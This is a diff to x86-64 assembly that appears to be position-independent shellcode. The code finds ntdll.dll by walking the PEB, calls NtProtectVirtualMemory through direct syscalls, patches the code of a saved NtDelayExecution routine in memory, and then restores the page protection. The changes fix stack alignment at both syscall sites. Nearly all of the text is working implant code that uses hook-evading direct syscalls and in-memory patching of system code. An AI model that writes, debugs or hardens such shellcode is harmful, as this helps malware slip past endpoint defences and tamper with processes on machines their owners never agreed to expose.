@@ -38,8 +38,10 @@ start:
     call sym_base
 sym_base:
     pop r12
-    ; 0x30 scratch: the syscall's 5th-arg slot ([rsp+0x20] after its own
-    ; `sub rsp,0x20`) must not land on the saved registers above
+    ; 0x30 scratch: headroom below the 8 saved registers (they sit at
+    ; [rsp+0x30..+0x70] after this sub). Each syscall site aligns RSP down from
+    ; here and reserves its frame in/just below this gap, so it must stay clear
+    ; of the registers above.
     sub rsp, 0x30
 
     ; ---- 1. PEB -> Ldr -> walk InLoadOrder for ntdll.dll -----------------
@@ -123,7 +125,12 @@ sym_base:
     mov r10, [r12 + (saved_ntdelay - sym_base)]
     mov [r12 + (prot_base - sym_base)], r10
     mov dword [r12 + (prot_size - sym_base)], 12
-    sub rsp, 0x38                    ; 16-align RSP; shadow [rsp+8..rsp+0x28), arg4 [rsp+0x28]
+    ; entry-independent 16-align for the `syscall`: park S0=rsp in r13, round
+    ; RSP down to 16 (works for ANY entry alignment, not just RSP%16==8), and
+    ; reserve the frame so arg4 lands at [rsp+0x28]. r13 is callee-saved and
+    ; preserved across the syscall, so it holds the restore point.
+    mov r13, rsp                     ; r13 = S0 (restore point)
+    and rsp, -16                     ; RSP = S0 & ~0xF (16-aligned, <= S0)
     lea r10, [r12 + (saved_old_prot - sym_base)]
     mov [rsp + 0x28], r10            ; arg4 = &saved_old_prot (OldProtect, out)
     lea rdx, [r12 + (prot_base - sym_base)]   ; arg1 = BaseAddress*
@@ -133,7 +140,7 @@ sym_base:
     mov r10, rcx                     ; arg0 -> R10 (the kernel reads arg0 from R10)
     mov eax, [r12 + (data_nr_protect - sym_base)]
     syscall
-    add rsp, 0x38
+    mov rsp, r13                     ; restore RSP = S0
     test eax, eax                    ; NTSTATUS: bit31 set = error/fatal
     jns .s6_patch                    ; success/warning -> go patch + mask
     ; NtProtect failed: the text isn't RWX, so we can't safely patch it in
@@ -169,7 +176,8 @@ sym_base:
     ; ---- 8. restore protection (to the saved OldProtect), flag done ------
     ;   Same ABI as step 5; arg3 = the original protection the kernel returned
     ;   into saved_old_prot, so we restore exactly what was there.
-    sub rsp, 0x38                    ; 16-align RSP; arg4 slot at [rsp+0x28]
+    mov r13, rsp                     ; r13 = S0 (restore point)
+    and rsp, -16                     ; RSP = S0 & ~0xF (16-aligned, entry-independent)
     lea r10, [r12 + (saved_old_prot - sym_base)]
     mov [rsp + 0x28], r10            ; arg4 = &saved_old_prot
     lea rdx, [r12 + (prot_base - sym_base)]   ; arg1 = BaseAddress* (pointer, like step 5)
@@ -179,7 +187,7 @@ sym_base:
     mov r10, rcx                     ; arg0 -> R10
     mov eax, [r12 + (data_nr_protect - sym_base)]
     syscall
-    add rsp, 0x38
+    mov rsp, r13                     ; restore RSP = S0
 
     mov qword [r12 + (done_flag - sym_base)], 1
 
